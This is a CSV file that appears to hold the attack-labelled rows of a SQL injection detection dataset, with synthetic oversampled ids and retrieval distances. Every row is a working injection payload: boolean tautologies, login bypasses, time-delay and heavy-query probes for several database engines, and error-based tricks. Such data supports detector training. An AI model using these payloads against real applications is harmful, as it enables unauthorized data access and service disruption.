id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000121,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000002,1.1920928955078125e-07
SMOTE_000122,attack,boolean,"-1072%""   )    )    or 3090  =  3539",nearest_attack_euclidean,R000701,0.010659288620086086
SMOTE_000123,attack,boolean," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",nearest_attack_euclidean,R000004,0.7169970824573484
SMOTE_000124,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001477,0.9334431052798499
SMOTE_000125,attack,boolean,"1""  )   and 4760  =  2922",nearest_attack_euclidean,R000672,0.02754656968504714
SMOTE_000126,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000138,0.39505364299422535
SMOTE_000127,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000008,0.0
SMOTE_000128,attack,boolean,admin'  )   or '1'  =  '1'--,nearest_attack_euclidean,R000030,0.018537042191557416
SMOTE_000129,attack,boolean,"-8612""  )   or 4043  =  3083 and   (  ""pjzo"" like ""pjzo",nearest_attack_euclidean,R000481,0.5132968062873322
SMOTE_000130,attack,boolean,1   )    )     )   and 8990  =  4775 and    (    (     (  1894  =  1894,nearest_attack_euclidean,R000954,0.8960561170772147
SMOTE_000131,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001187,0.3297038302894712
SMOTE_000132,attack,boolean,"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'aezm' like 'aezm",nearest_attack_euclidean,R000359,0.6881589926310347
SMOTE_000133,attack,boolean,"1"" where 4082  =  4082 and elt  (  5699  =  1432,1432  )  --",nearest_attack_euclidean,R000897,0.22553698249132073
SMOTE_000134,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R000523,1.1466797155566304
SMOTE_000135,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000322,0.15541633284539003
SMOTE_000136,attack,boolean,"1'||  (  select 'vekn' from dual where 4929  =  4929 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",nearest_attack_euclidean,R000271,0.37563723347202904
SMOTE_000137,attack,boolean,-3044'  )   or 4999  =  3051#,nearest_attack_euclidean,R000403,0.22181905137314048
SMOTE_000138,attack,boolean,"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""rphs""  =  ""rphs",nearest_attack_euclidean,R001164,0.3027483746550336
SMOTE_000139,attack,boolean,-7293'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000339,0.12476353491518091
SMOTE_000140,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R000270,0.13113272517032773
SMOTE_000141,attack,boolean,"1""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001148,0.6785258057233721
SMOTE_000142,attack,boolean,"1' where 4860  =  4860 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000727,0.5931599578862078
SMOTE_000143,attack,boolean,1%' and   (  3020  =  3020  )  *6703 and '%'  =  ',nearest_attack_euclidean,R000240,0.6119660706882435
SMOTE_000144,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""kngx"" like ""kngx",nearest_attack_euclidean,R001214,0.00041486446168372156
SMOTE_000145,attack,boolean,"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # miji",nearest_attack_euclidean,R001182,0.16546606269288827
SMOTE_000146,attack,boolean,"1""  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""xsfg"" like ""xsfg",nearest_attack_euclidean,R001474,0.16722343516811888
SMOTE_000147,attack,boolean," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.1397210577120524
SMOTE_000148,attack,boolean,"-2548""   )    )     )   or 5107  =  8049--",nearest_attack_euclidean,R000182,0.2916897953474155
SMOTE_000149,attack,boolean,"1'+  (  select 'ycsv' where 3628  =  3628 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000507,1.385882787057512
SMOTE_000150,attack,boolean,"1%"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R001357,0.3735549643322572
SMOTE_000151,attack,boolean,"1%"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000975,0.07579253171594595
SMOTE_000152,attack,boolean,"-5245' or elt  (  1032  =  1032,3623  )   and 'qfvo'  =  'qfvo",nearest_attack_euclidean,R001079,0.03269180929993977
SMOTE_000153,attack,boolean,-9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa,nearest_attack_euclidean,R001049,0.4571398470019478
SMOTE_000154,attack,boolean,-8187'   )    )     )   or 1698  =  2823#,nearest_attack_euclidean,R000566,1.0702547686166939
SMOTE_000155,attack,boolean,1 where 9361  =  9361 and 7478  =  9170--,nearest_attack_euclidean,R001283,0.6544487353526641
SMOTE_000156,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""tbcc""  =  ""tbcc",nearest_attack_euclidean,R001058,0.10525307406537085
SMOTE_000157,attack,boolean,"1   )    )    as acni where 6355  =  6355 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000745,0.42501323473641306
SMOTE_000158,attack,boolean,1' in boolean mode  )   and 2006  =  2006,nearest_attack_euclidean,R000678,0.5803931240001657
SMOTE_000159,attack,boolean,"1   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R001023,0.6903938587989065
SMOTE_000160,attack,boolean,"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""oyou""  =  ""oyou",nearest_attack_euclidean,R000885,0.14571448362238018
SMOTE_000161,attack,boolean,1%'   )    )     )   and 4595  =  4595#,nearest_attack_euclidean,R000622,0.8306291581276515
SMOTE_000162,attack,boolean,"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # ehsr",nearest_attack_euclidean,R000392,0.4052030463556402
SMOTE_000163,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""tbcc""  =  ""tbcc",nearest_attack_euclidean,R001058,0.04750650919159909
SMOTE_000164,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  '%'  =  '",nearest_attack_euclidean,R001389,0.1510062250971137
SMOTE_000165,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'lwrk' like 'lwrk",nearest_attack_euclidean,R001521,0.40370793249750764
SMOTE_000166,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""kngx"" like ""kngx",nearest_attack_euclidean,R001214,0.28602256656866065
SMOTE_000167,attack,boolean,1'+  (  select 'czpg' where 6627  =  6627 and 2006  =  2006,nearest_attack_euclidean,R000514,0.1884428520220648
SMOTE_000168,attack,boolean,"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '",nearest_attack_euclidean,R001509,0.0903599787434749
SMOTE_000169,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000117,0.423073928265919
SMOTE_000170,attack,boolean,"1%""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001545,0.8655836842241065
SMOTE_000171,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'xaoi'  =  'xaoi",nearest_attack_euclidean,R000472,0.46218335827449436
SMOTE_000172,attack,boolean,"1%'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001279,0.5124263160630957
SMOTE_000173,attack,boolean,"1 where 7906  =  7906 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001073,0.11125055201236043
SMOTE_000174,attack,boolean,"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000347,0.0076676639987203225
SMOTE_000175,attack,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R000861,1.5765385514170218
SMOTE_000176,attack,boolean,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rspz'  =  'rspz",nearest_attack_euclidean,R000382,1.0626319723361073
SMOTE_000177,attack,boolean,-3748' where 9292  =  9292 or 3337  =  2859#,nearest_attack_euclidean,R000802,0.21860089349839673
SMOTE_000178,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001483,0.04891970262934587
SMOTE_000179,attack,boolean,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",nearest_attack_euclidean,R000127,0.21975505117175526
SMOTE_000180,attack,boolean,"-5963"" or 9323  =  9323#",nearest_attack_euclidean,R001461,0.026387861914793476
SMOTE_000181,attack,boolean,"1   )    )    and make_set  (  8554  =  3286,3286  )   and    (    (   7385  =  7385",nearest_attack_euclidean,R000626,0.025825159040607355
SMOTE_000182,attack,boolean,-9120'   )    )    or 8571  =  8571--,nearest_attack_euclidean,R001048,0.5009588450674637
SMOTE_000183,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R001343,0.03610015182843803
SMOTE_000184,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000592,0.577670351925561
SMOTE_000185,attack,boolean,"1  )   as rtpl where 1262  =  1262 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000430,0.9650525359024806
SMOTE_000186,attack,boolean,1 and 7533  =  7533,nearest_attack_euclidean,R001108,0.5159486176688629
SMOTE_000187,attack,boolean,"1""   )    )    and 7533  =  7533 and    (    (   ""rnni"" like ""rnni",nearest_attack_euclidean,R000224,0.4537872185993389
SMOTE_000188,attack,boolean,"1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'fvov'  =  'fvov",nearest_attack_euclidean,R000281,0.0201003854610655
SMOTE_000189,attack,boolean,"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""oyfz""  =  ""oyfz",nearest_attack_euclidean,R001105,0.3105533061221362
SMOTE_000190,attack,boolean,"1   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4090  =  4090",nearest_attack_euclidean,R000534,0.2102940659462406
SMOTE_000191,attack,boolean,"1""   )    )    as ihfw where 3949  =  3949 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000491,0.06413818746918604
SMOTE_000192,attack,boolean,1 and 7533  =  7533,nearest_attack_euclidean,R001108,0.057081893615073036
SMOTE_000193,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,0.7186969546364899
SMOTE_000194,attack,boolean,"1""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""gvlc"" like ""gvlc",nearest_attack_euclidean,R000548,0.2892461146610954
SMOTE_000195,attack,boolean,"1""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001220,1.0771082571076933
SMOTE_000196,attack,boolean,"-8612""  )   or 4043  =  3083 and   (  ""pjzo"" like ""pjzo",nearest_attack_euclidean,R000481,0.31273705011463493
SMOTE_000197,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R001022,0.07646466167559172
SMOTE_000198,attack,boolean,"1'  )   where 7561  =  7561 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000263,0.13081124465599345
SMOTE_000199,attack,boolean,"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'jhxh'  =  'jhxh",nearest_attack_euclidean,R001243,0.0812188447279989
SMOTE_000200,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R001125,0.5726529507743764
SMOTE_000201,attack,boolean,1'   )    )     )   and 7533  =  7533 and    (    (     (  'hoyw'  =  'hoyw,nearest_attack_euclidean,R001201,0.057590126297510376
SMOTE_000202,attack,boolean,"1%' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '%'  =  '",nearest_attack_euclidean,R000543,0.32595906284216314
SMOTE_000203,attack,boolean,"-8550""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kyad""  =  ""kyad",nearest_attack_euclidean,R000878,0.02265766664068279
SMOTE_000204,attack,boolean,"1%"" or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R001541,0.19864464409796412
SMOTE_000205,attack,boolean,hi'  )   or   (  'a'  =  'a,nearest_attack_euclidean,R000025,0.33171350364319213
SMOTE_000206,attack,boolean,-2929'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'nzmk'  =  'nzmk,nearest_attack_euclidean,R001143,0.6038487192806622
SMOTE_000207,attack,boolean,"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R001038,0.30237858749964897
SMOTE_000208,attack,boolean, or 'something' like 'some%',nearest_attack_euclidean,R000072,0.508150591125221
SMOTE_000209,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000012,0.8076860469933181
SMOTE_000210,attack,boolean,"1'||  (  select 'eamo' where 4958  =  4958 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",nearest_attack_euclidean,R001172,1.142134442484816
SMOTE_000211,attack,boolean,"1%""   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000216,1.1055130930560535
SMOTE_000212,attack,boolean,"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'narn'  =  'narn",nearest_attack_euclidean,R001519,0.5428039898466108
SMOTE_000213,attack,boolean,"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",nearest_attack_euclidean,R001330,1.2707410994340411
SMOTE_000214,attack,boolean,"1  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000946,0.029587600861323945
SMOTE_000215,attack,boolean,"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000809,0.6916466269242376
SMOTE_000216,attack,boolean,"1"" and 1668  =  8288",nearest_attack_euclidean,R000298,0.038365719436900904
SMOTE_000217,attack,boolean,"1%'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000367,1.158008205934223
SMOTE_000218,attack,boolean,1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'vtoi' like 'vtoi,nearest_attack_euclidean,R000950,0.2441216966630498
SMOTE_000219,attack,boolean,"-7749"" or   (  2689  =  7481  )  *7481",nearest_attack_euclidean,R001259,0.10177358340946291
SMOTE_000220,attack,boolean,"1'||  (  select 'yrau' where 7860  =  7860 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",nearest_attack_euclidean,R001384,1.4525187759771048
SMOTE_000221,attack,boolean,-6178   )    )    as lygb where 9559  =  9559 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R001351,0.5067198959109055
SMOTE_000222,attack,boolean,"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""azpb""  =  ""azpb",nearest_attack_euclidean,R000649,0.11386933654519739
SMOTE_000223,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000695,0.18880328220695083
SMOTE_000224,attack,boolean,"1'  )   as sjzi where 8242  =  8242 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000747,0.018418671965496305
SMOTE_000225,attack,boolean,"1'  )   where 7561  =  7561 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000263,0.14155753198362897
SMOTE_000226,attack,boolean,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R001304,0.36807334405119596
SMOTE_000227,attack,boolean,-2983'  )   or 8571  =  8571--,nearest_attack_euclidean,R001086,0.09325743107223966
SMOTE_000228,attack,boolean,"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",nearest_attack_euclidean,R000489,0.3326131810455598
SMOTE_000229,attack,boolean,-7378' or 6872  =  6872 and 'bnmn' like 'bnmn,nearest_attack_euclidean,R001163,0.9648221331840477
SMOTE_000230,attack,boolean,"1' where 8869  =  8869 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000903,0.018995951794921365
SMOTE_000231,attack,boolean,-2784  )   where 5261  =  5261 or 3472  =  1728#,nearest_attack_euclidean,R001131,0.10452338182325048
SMOTE_000232,attack,boolean,"1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000916,0.08365143510197492
SMOTE_000233,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R001022,0.0
SMOTE_000234,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001087,0.4807587642321479
SMOTE_000235,attack,boolean,"1'||  (  select 'nbmo' from dual where 5572  =  5572 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001000,1.4903212213063144
SMOTE_000236,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""khuw"" like ""khuw",nearest_attack_euclidean,R000638,0.3823790735300729
SMOTE_000237,attack,boolean,"-2548""   )    )     )   or 5107  =  8049--",nearest_attack_euclidean,R000182,0.7840311277691768
SMOTE_000238,attack,boolean,-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,nearest_attack_euclidean,R000541,0.5079716740949834
SMOTE_000239,attack,boolean,"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",nearest_attack_euclidean,R001277,0.6158692307966169
SMOTE_000240,attack,boolean,"1"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001004,0.9194828848846036
SMOTE_000241,attack,boolean,"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000849,0.5018596638356777
SMOTE_000242,attack,boolean,"1%'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R001417,0.14158596587640704
SMOTE_000243,attack,boolean,"1   )    )    as llnm where 6510  =  6510 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001288,0.02392555827560654
SMOTE_000244,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  '%'  =  '",nearest_attack_euclidean,R000822,0.0005031803777690217
SMOTE_000245,attack,boolean,1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'sqvt' like 'sqvt,nearest_attack_euclidean,R001471,0.050317943142725086
SMOTE_000246,attack,boolean,-5880'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rwgl'  =  'rwgl,nearest_attack_euclidean,R001153,0.08567450377010652
SMOTE_000247,attack,boolean,"1""  )   as jtou where 8129  =  8129 and 7533  =  7533--",nearest_attack_euclidean,R000343,0.04689130795781671
SMOTE_000248,attack,boolean,"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""rphs""  =  ""rphs",nearest_attack_euclidean,R001164,0.8934717894032914
SMOTE_000249,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R001057,0.21652607332343476
SMOTE_000250,attack,boolean,"1   )    )    as amyr where 7875  =  7875 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000366,0.493873295884133
SMOTE_000251,attack,boolean,"1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000342,0.22590076045148488
SMOTE_000252,attack,boolean,"1 where 2988  =  2988 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000751,1.107805763044044
SMOTE_000253,attack,boolean,end and   (  '%'  =  ',nearest_attack_euclidean,R000955,0.4299786718354193
